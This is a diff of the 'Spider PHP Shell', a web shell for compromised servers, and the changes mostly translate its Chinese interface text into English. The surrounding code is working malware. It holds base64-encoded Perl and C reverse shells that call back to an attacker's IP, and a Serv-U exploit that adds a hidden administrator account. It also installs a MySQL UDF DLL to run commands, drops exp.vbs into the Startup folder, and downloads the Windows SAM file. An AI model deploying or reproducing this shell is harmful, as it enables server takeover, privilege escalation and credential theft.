 	$yourport = isset($_POST['yourport']) ? $_POST['yourport'] : '12666';
 print<<<END
 <form method="POST" name="kform" id="kform" action="?s=k">
-<div class="actall">你的地址 <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
-<div class="actall">连接端口 <input type="text" name="yourport" value="12666" style="width:400px"></div>
-<div class="actall">执行方式 <select name="use" >
+<div class="actall">your address <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
+<div class="actall">Connection port <input type="text" name="yourport" value="12666" style="width:400px"></div>
+<div class="actall">execution way <select name="use" >
 <option value="perl">perl</option>
 <option value="c">c</option>
 </select></div>
-<div class="actall"><input type="submit" value="开始连接" style="width:80px;"></div></form>
+<div class="actall"><input type="submit" value="Start connecting" style="width:80px;"></div></form>
 END;
 	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
 	{
@@ -1233,10 +1236,10 @@ END;
 			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
 			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
 			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
-			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '创建/tmp/spider_bc成功<br>' : '创建/tmp/spider_bc失败<br>';
+			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? 'create/tmp/spider_bc_succeeded<br>' : 'create/tmp/spider_bc_failed<br>';
 			$perlpath = Exec_Run('which perl');
 			$perlpath = $perlpath ? chop($perlpath) : 'perl';
-			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
+			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Failed to execute command';
 		}
 		if($_POST['use'] == 'c')
 		{
@@ -1248,12 +1251,12 @@ END;
 			"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
 			"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
 			"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
-			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? '创建/tmp/spider_bc.c成功<br>' : '创建/tmp/spider_bc.c失败<br>';
+			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? 'create/tmp/spider_bc.csuccess<br>' : 'create/tmp/spider_bc.cfails<br>';
 			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
 			@unlink('/tmp/spider_bc.c');
-			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
+			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Failed to execute command';
 		}
-		echo '<br>你可以尝试连接端口 (nc -l -n -v -p '.$_POST['yourport'].') </div>';
+		echo '<br>You can try to connect port (nc -l -n -v -p '.$_POST['yourport'].') </div>';
 	}
 	return true;
 }
@@ -1264,30 +1267,30 @@ function Servu_l()
 {
 	$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
 print<<<END
-<div class="actall"><a href="?s=l">[执行命令]</a> <a href="?s=l&o=adduser">[添加用户]</a></div>
+<div class="actall"><a href="?s=l">[Excuting an order]</a> <a href="?s=l&o=adduser">[Add user]</a></div>
 <form method="POST">
-	<div class="actall">ServU端口 <input name="SUPort" type="text" value="43958" style="width:300px"></div>
-	<div class="actall">ServU用户 <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
-	<div class="actall">ServU密码 <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
+	<div class="actall">ServU port <input name="SUPort" type="text" value="43958" style="width:300px"></div>
+	<div class="actall">ServU users <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
+	<div class="actall">ServU password <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
 END;
 if($_GET['o'] == 'adduser')
 {
 print<<<END
-<div class="actall">帐号 <input name="user" type="text" value="spider" style="width:200px">
-密码 <input name="password" type="text" value="spider" style="width:200px">
-目录 <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
+<div class="actall">account number <input name="user" type="text" value="spider" style="width:200px">
+password <input name="password" type="text" value="spider" style="width:200px">
+table of Contents <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
 END;
 }
 else
 {
 print<<<END
-<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user spider spider /add & net localgroup administrators spider /add" style="width:600px"><br>
+<div class="actall">Escalation order <input name="SUCommand" type="text" value="net user spider spider /add & net localgroup administrators spider /add" style="width:600px"><br>
 <input name="user" type="hidden" value="spider">
 <input name="password" type="hidden" value="spider">
 <input name="part" type="hidden" value="C:\\\\"></div>
 END;
 }
-echo '<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>';
+echo '<div class="actall"><input type="submit" value="execute" style="width:80px;"></div></form>';
 	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
 	{
 		echo '<div class="actall">';
@@ -1305,52 +1308,52 @@ echo '<div class="actall"><input type="submit" value="执行" style="width:80px;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
 		echo "Kirim paket: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "返回数据包: $recvbuf <br>";
+		echo "Return packet: $recvbuf <br>";
 		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "发送数据包: $sendbuf <br>";
+		echo "Send packet: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "返回数据包: $recvbuf <br>";
+		echo "Return packet: $recvbuf <br>";
 		$sendbuf = "SITE MAINTENANCE\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "发送数据包: $sendbuf <br>";
+		echo "Send packet: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "返回数据包: $recvbuf <br>";
+		echo "Return packet: $recvbuf <br>";
 		$sendbuf = $domain;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "发送数据包: $sendbuf <br>";
+		echo "Send packet: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "返回数据包: $recvbuf <br>";
+		echo "Return packet: $recvbuf <br>";
 		$sendbuf = $adduser;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "发送数据包: $sendbuf <br>";
+		echo "Send packet: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "返回数据包: $recvbuf <br>";
+		echo "Return packet: $recvbuf <br>";
 		if(!empty($_POST['SUCommand']))
 		{
 	 		$exp = @fsockopen("127.0.0.1", "21", $errno, $errstr, 10);
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "返回数据包: $recvbuf <br>";
+	 		echo "Return packet: $recvbuf <br>";
 	 		$sendbuf = "USER ".$_POST['user']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "发送数据包: $sendbuf <br>";
+	 		echo "Send packet: $sendbuf <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "返回数据包: $recvbuf <br>";
+	 		echo "Return packet: $recvbuf <br>";
 	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "发送数据包: $sendbuf <br>";
+	 		echo "Send packet: $sendbuf <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "返回数据包: $recvbuf <br>";
+	 		echo "Return packet: $recvbuf <br>";
 	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "发送数据包: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
+	 		echo "Send packet: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "返回数据包: $recvbuf <br>";
+	 		echo "Return packet: $recvbuf <br>";
 	 		$sendbuf = $deldomain;
 	 		@fputs($sock, $sendbuf, strlen($sendbuf));
-	 		echo "发送数据包: $sendbuf <br>";
+	 		echo "Send packet: $sendbuf <br>";
 	 		$recvbuf = @fgets($sock, 1024);
-	 		echo "返回数据包: $recvbuf <br>";
+	 		echo "Return packet: $recvbuf <br>";
 	 		@fclose($exp);
 		}
 		@fclose($sock);
@@ -1367,8 +1370,8 @@ function Mysql_shellcode()
 
 function Mysql_m()
 {
-	$MSG_BOX = '请先导出DLL,再执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件.';
-	$info = '命令回显';
+	$MSG_BOX = 'Please export the DLL first,Execute the command again.MYSQL user must have root privileges,The export path must be able to load the DLL file.';
+	$info = 'Command echo';
 	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = 'C:/windows/mysqlDll.dll'; $sqlcmd = 'ver';
 	if(isset($_POST['mhost']) && isset($_POST['muser']))
 	{
@@ -1391,14 +1394,14 @@ function Mysql_m()
 						{
 							$ap = explode('/', $mpath); $inpath = array_pop($ap);
 							$query = 'Create Function state returns string soname \''.$inpath.'\';';
-							$MSG_BOX = @mysql_query($query,$conn) ? '安装DLL成功' : '安装DLL失败';
+							$MSG_BOX = @mysql_query($query,$conn) ? 'DLL installed successfully' : 'DLL installation failed';
 						}
-						else $MSG_BOX = '导出DLL文件失败';
+						else $MSG_BOX = 'Failed to export DLL file';
 					}
-					else $MSG_BOX = '写入临时表失败';
+					else $MSG_BOX = 'Failed to write to temporary table';
 					@mysql_query('DROP TABLE Spider_Temp_Tab;',$conn);
 				}
-				else $MSG_BOX = '创建临时表失败';
+				else $MSG_BOX = 'Failed to create temporary table';
 			}
 			if(!empty($_POST['runcmd']))
 			{
@@ -1409,12 +1412,12 @@ function Mysql_m()
 					$k = 0; $info = NULL;
 					while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;}
 					$info = $infotmp;
-					$MSG_BOX = '执行成功';
+					$MSG_BOX = 'execution succeed';
 				}
-				else $MSG_BOX = '执行失败';
+				else $MSG_BOX = 'Execution failed';
 			}
 		}
-		else $MSG_BOX = '连接MYSQL失败';
+		else $MSG_BOX = 'Failed to connect to MYSQL';
 	}
 print<<<END
 <script language="javascript">
@@ -1438,29 +1441,29 @@ function Fullm(i){
 <form method="POST" name="mform" id="mform" action="?s=m">
 <div id="msgbox" class="msgbox">{$MSG_BOX}</div>
 <center><div class="actall">
-地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
-端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
-用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
-密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
-库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
+address <input type="text" name="mhost" value="{$mhost}" style="width:110px">
+port <input type="text" name="mport" value="{$mport}" style="width:110px">
+user <input type="text" name="muser" value="{$muser}" style="width:110px">
+password <input type="text" name="mpass" value="{$mpass}" style="width:110px">
+Library name <input type="text" name="mdata" value="{$mdata}" style="width:110px">
 </div><div class="actall">
-可加载路径 <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
-<input type="submit" name="outdll" value="安装DLL" style="width:80px;"></div>
-<div class="actall">安装成功后可用 <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
+Loadable path <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
+<input type="submit" name="outdll" value="Install DLL" style="width:80px;"></div>
+<div class="actall">Available after successful installation <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
 <select onchange="return Fullm(options[selectedIndex].value)">
-<option value="0" selected>--命令集合--</option>
-<option value="1">添加管理员</option>
-<option value="2">设为管理组</option>
-<option value="3">开启远程桌面</option>
-<option value="4">查看端口</option>
-<option value="5">查看IP</option>
-<option value="6">激活guest帐户</option>
-<option value="7">复制文件</option>
-<option value="8">ftp下载</option>
-<option value="9">开启telnet</option>
-<option value="10">重启</option>
+<option value="0" selected>--Command collection--</option>
+<option value="1">Add manager</option>
+<option value="2">Set as management group</option>
+<option value="3">Open remote desktop</option>
+<option value="4">View port</option>
+<option value="5">View IP</option>
+<option value="6">Activate guest account</option>
+<option value="7">Copy files</option>
+<option value="8">ftp download</option>
+<option value="9">Open telnet</option>
+<option value="10">Reboot</option>
 </select>
-<input type="submit" name="runcmd" value="执行" style="width:80px;">
+<input type="submit" name="runcmd" value="carried out" style="width:80px;">
 <textarea style="width:720px;height:300px;">{$info}</textarea>
 </div></center>
 </form>
@@ -1476,7 +1479,7 @@ function Mysql_n()
 	{
 		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
 		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
-		else $MSG_BOX = '连接MYSQL失败';
+		else $MSG_BOX = 'Failed to connect to MYSQL';
 	}
 	$downfile = 'c:/windows/repair/sam';
 	if(!empty($_POST['downfile']))
@@ -1504,21 +1507,21 @@ function Mysql_n()
 	Root_CSS();
 print<<<END
 <form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
-<center><div class="actall"><a href="?s=n">[MYSQL执行语句]</a> 
-<a href="?s=n&o=u">[MYSQL上传文件]</a> 
-<a href="?s=n&o=d">[MYSQL下载文件]</a></div>
+<center><div class="actall"><a href="?s=n">[MYSQL execution statement]</a> 
+<a href="?s=n&o=u">[MYSQL upload file]</a> 
+<a href="?s=n&o=d">[MYSQL download file]</a></div>
 <div class="actall">
-地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
-端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
-用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
-密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
-库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
+address <input type="text" name="mhost" value="{$mhost}" style="width:110px">
+port <input type="text" name="mport" value="{$mport}" style="width:110px">
+user <input type="text" name="muser" value="{$muser}" style="width:110px">
+password <input type="text" name="mpass" value="{$mpass}" style="width:110px">
+Library name <input type="text" name="mdata" value="{$mdata}" style="width:110px">
 </div>
 <div class="actall" style="height:220px;">
 END;
 if($o == 'u')
 {
-	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
+	$uppath = 'C:/Documents and Settings/All Users/StartMenu/Program/startup/exp.vbs';
 	if(!empty($_POST['uppath']))
 	{
 		$uppath = $_POST['uppath'];
@@ -1531,24 +1534,24 @@ if($o == 'u')
 			if(@mysql_query($query,$conn))
 			{
 				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
-				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
+				$MSG_BOX = @mysql_query($query,$conn) ? 'File uploaded successfully' : 'File upload failed';
 			}
-			else $MSG_BOX = '插入临时表失败';
+			else $MSG_BOX = 'Failed to insert temporary table';
 			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
 		}
-		else $MSG_BOX = '创建临时表失败';
+		else $MSG_BOX = 'Failed to create temporary table';
 	}
 print<<<END
-<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
-<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
-</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
+<br><br>Upload path <input type="text" name="uppath" value="{$uppath}" style="width:500px">
+<br><br>Select a document <input type="file" name="upfile" style="width:500px;height:22px;">
+</div><div class="actall"><input type="submit" value="Upload" style="width:80px;">
 END;
 }
 elseif($o == 'd')
 {
 print<<<END
-<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
-</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
+<br><br><br>download file <input type="text" name="downfile" value="{$downfile}" style="width:500px">
+</div><div class="actall"><input type="submit" value="download" style="width:80px;">
 END;
 }
 else
@@ -1558,7 +1561,7 @@ else
 		$msql = $_POST['msql'];
 		if($result = @mysql_query($msql,$conn))
 		{
-			$MSG_BOX = '执行SQL语句成功<br>';
+			$MSG_BOX = 'SQL statement executed successfully<br>';
 			$k = 0;
 			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
 		}
@@ -1579,12 +1582,12 @@ function nFull(i){
 <textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
 <div class="actall">
 <select onchange="return nFull(options[selectedIndex].value)">
-	<option value="0" selected>显示版本</option>
-	<option value="1">导出文件</option>
-	<option value="2">写入文件</option>
-	<option value="3">开启外连</option>
+	<option value="0" selected>Show version</option>
+	<option value="1">Export file</option>
+	<option value="2">Write file</option>
+	<option value="3">Open external connection</option>
 </select>
-<input type="submit" value="执行" style="width:80px;">
+<input type="submit" value="carried out" style="width:80px;">
 END;
 }
 	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
@@ -1609,7 +1612,7 @@ print<<<END
 <script language="javascript">
 function Delok(msg,gourl)
 {
-	smsg = "确定要删除[" + unescape(msg) + "]吗?";
+	smsg = "Sure to delete[" + unescape(msg) + "]Is it?";
 	if(confirm(smsg)){window.location = gourl;}
 }
 function Createok(ac)
@@ -1622,18 +1625,18 @@ function Createok(ac)
 </script>
 END;
 		$BOOL = false;
-		$MSG_BOX = '用户:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
+		$MSG_BOX = 'user:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; address:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; version:';
 		$k = 0;
 		$result = @mysql_query('select version();',$conn);
 		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
-		echo '<div class="actall"> 数据库:';
+		echo '<div class="actall"> database:';
 		$result = mysql_query("SHOW DATABASES",$conn);
 		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
 		echo '</div>';
 		if(isset($_GET['db']))
 		{
 			mysql_select_db($_GET['db'],$conn);
-			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();}
+			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'execution succeed' : 'Execution failed '.mysql_error();}
 			if(is_array($_POST['insql']))
 			{
 				$query = 'INSERT INTO '.$_GET['table'].' (';
@@ -1643,7 +1646,7 @@ END;
 					$queryb .= '\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
-				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'Added successfully' : 'add failed '.mysql_error();
 			}
 			if(is_array($_POST['upsql']))
 			{
@@ -1653,7 +1656,7 @@ END;
 					$queryb .= $var.'=\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
-				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'Successfully modified' : 'fail to edit '.mysql_error();
 			}
 			if(isset($_GET['del']))
 			{
@@ -1662,23 +1665,23 @@ END;
 				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
 				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
 				$where = $query.substr($queryc, 0, -4).';';
-				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
+				$MSG_BOX = mysql_query($where,$conn) ? 'successfully deleted' : 'failed to delete '.mysql_error();
 			}
 			$action = '?s=r&db='.$_GET['db'];
-			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
+			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'successfully deleted' : 'failed to delete '.mysql_error();}
 			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
 			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
 			echo '<div class="actall"><form method="POST" action="'.$action.'">';
 			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
-			echo '<input type="submit" name="querysql" value="执行" style="width:60px;height:49px;"> ';
-			echo '<input type="button" value="创建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
-			echo '<input type="button" value="创建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
-			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
+			echo '<input type="submit" name="querysql" value="submit" style="width:60px;height:49px;"> ';
+			echo '<input type="button" value="Create table" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
+			echo '<input type="button" value="Create library" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
+			echo '<input type="button" value="Delete library" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
 			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
 			if(isset($_GET['table']))
 			{
 				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
-				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入</a>]</div>';
+				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">insert</a>]</div>';
 				if(isset($_GET['edit']))
 				{
 					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
@@ -1706,7 +1709,7 @@ END;
 		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
 		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
 					echo '<table border="0"><tr>';
-					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
+					echo '<td class="toptd" style="width:70px;" nowrap>operating</td>';
 					while($row = @mysql_fetch_assoc($result))
 					{
 						array_push($fields,$row['Field']);
@@ -1718,8 +1721,8 @@ END;
 					$v = $p;
 					while($text = @mysql_fetch_assoc($result))
 					{
-						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
-						echo '<a href="#" onclick="Delok(\'它\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
+						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> modify </a> ';
+						echo '<a href="#" onclick="Delok(\'它\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> delete </a></td>';
 						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
 						echo '</tr>'."\r\n";$v++;
 					}
@@ -1754,16 +1757,16 @@ END;
 				}
 				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
 				echo '</div><table border="0"><tr>';
-				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
-				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
-				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
-				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
+				echo '<td class="toptd" style="width:550px;"> Table Name </td>';
+				echo '<td class="toptd" style="width:80px;"> operating </td>';
+				echo '<td class="toptd" style="width:130px;"> character set </td>';
+				echo '<td class="toptd" style="width:70px;"> size </td></tr>';
 				$result = @mysql_query($query,$conn);
 				$k = 0;
 				while($table = mysql_fetch_row($result))
 				{
 					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
-					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
+					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> insert </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> delete </a></td>';
 					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
 					$k++;
 				}
@@ -1771,7 +1774,7 @@ END;
 			}
 		}
 	}
-	else die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?s=o">');
+	else die('Failed to connect to MYSQL,Please log in again.<meta http-equiv="refresh" content="0;URL=?s=o">');
 	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
 	return false;
 }
@@ -1788,16 +1791,16 @@ function Mysql_o()
 	  	setcookie('m_spiderport',$_POST['mport'],$cookietime);
 	  	setcookie('m_spideruser',$_POST['muser'],$cookietime);
 	  	setcookie('m_spiderpass',$_POST['mpass'],$cookietime);
-	  	die('正在登陆,请稍候...<meta http-equiv="refresh" content="0;URL=?s=r">');
+	  	die('Logging in,Please wait...<meta http-equiv="refresh" content="0;URL=?s=r">');
 	  }
   }
 print<<<END
 <form method="POST" name="oform" id="oform" action="?s=o">
-<div class="actall">地址 <input type="text" name="mhost" value="localhost" style="width:300px"></div>
-<div class="actall">端口 <input type="text" name="mport" value="3306" style="width:300px"></div>
-<div class="actall">用户 <input type="text" name="muser" value="root" style="width:300px"></div>
-<div class="actall">密码 <input type="text" name="mpass" value="" style="width:300px"></div>
-<div class="actall"><input type="submit" value="登陆" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
+<div class="actall">address <input type="text" name="mhost" value="localhost" style="width:300px"></div>
+<div class="actall">port <input type="text" name="mport" value="3306" style="width:300px"></div>
+<div class="actall">user <input type="text" name="muser" value="root" style="width:300px"></div>
+<div class="actall">password <input type="text" name="mpass" value="" style="width:300px"></div>
+<div class="actall"><input type="submit" value="Sign in" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
 </form>
 END;
 	ob_end_flush();
@@ -1830,18 +1833,68 @@ function WinMain()
 	$Server_OS = PHP_OS;
 	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
 	$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
-print<<<END
+?>
 <html>
 	<title> Spider PHP Shell (SPS-3.0) </title>
 	<head>
 		<style type="text/css">
-			*{padding:0; margin:0;}
-			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px; text-align:center;margin-top:5px;word-break:break-all;}
-			a{color:#FFFFFF;text-decoration:none;}
-			a:hover{background:#BBBBBB;}
-			.outtable {margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
-			.topbg {padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
-			.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
+			*{
+				padding:0; margin:0;
+			}
+			body {
+				background:#AAAAAA;
+				font-family:"Verdana", "Tahoma", "宋体",sans-serif; 
+				font-size:13px; 
+				text-align:center;
+				margin-top:5px;
+				word-break:break-all;
+			}
+			a {
+				color:#FFFFFF;
